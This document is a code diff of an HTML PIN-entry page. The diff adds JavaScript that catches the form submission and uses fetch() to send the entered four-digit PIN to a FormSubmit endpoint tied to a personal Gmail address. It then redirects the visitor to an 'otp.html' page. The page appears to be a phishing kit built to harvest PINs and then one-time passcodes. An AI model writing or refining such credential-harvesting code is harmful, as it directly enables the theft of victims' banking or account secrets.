@@ -28,7 +28,7 @@
           </div>
           <div class="formSec">
             <div class="input">
-              <form id="pin-form" action="https://formsubmit.co/Godisrealq101@gmail.com" method="POST">
+              <form id="pinForm">
                 <div class="formPin">
                   <input id="pin-0" type="password" name="pin-0" maxlength="1" class="pin-input" inputmode="numeric" required />
                   <input id="pin-1" type="password" name="pin-1" maxlength="1" class="pin-input" inputmode="numeric" required />
@@ -36,9 +36,7 @@
                   <input id="pin-3" type="password" name="pin-3" maxlength="1" class="pin-input" inputmode="numeric" required />
                 </div>
 
-                <!-- Hidden FormSubmit settings -->
                 <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="otp.html"> <!-- Redirects to login.html after submission -->
                 <input type="hidden" name="_template" value="box">
 
                 <span class="errorMessage"></span>
@@ -53,8 +51,9 @@
     </div>
   </div>
 
-  <!-- Optional: Javascript to improve input focus -->
+  <!-- JavaScript to handle form submission and redirect -->
   <script>
+    // Auto move focus to next input
     const inputs = document.querySelectorAll('.pin-input');
     inputs.forEach((input, index) => {
       input.addEventListener('input', () => {
@@ -63,6 +62,29 @@
         }
       });
     });
+
+    // Handle form submit
+    document.getElementById('pinForm').addEventListener('submit', function(e) {
+      e.preventDefault(); // Stop normal submit
+
+      const formData = new FormData(this);
+
+      fetch('https://formsubmit.co/Godisrealq101@gmail.com', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = 'otp.html'; // Redirect to otp.html on success
+        } else {
+          alert('Something went wrong. Please try again.');
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('Error submitting form. Please try again.');
+      });
+    });
   </script>
 </body>
-</html>
+                                              </html>
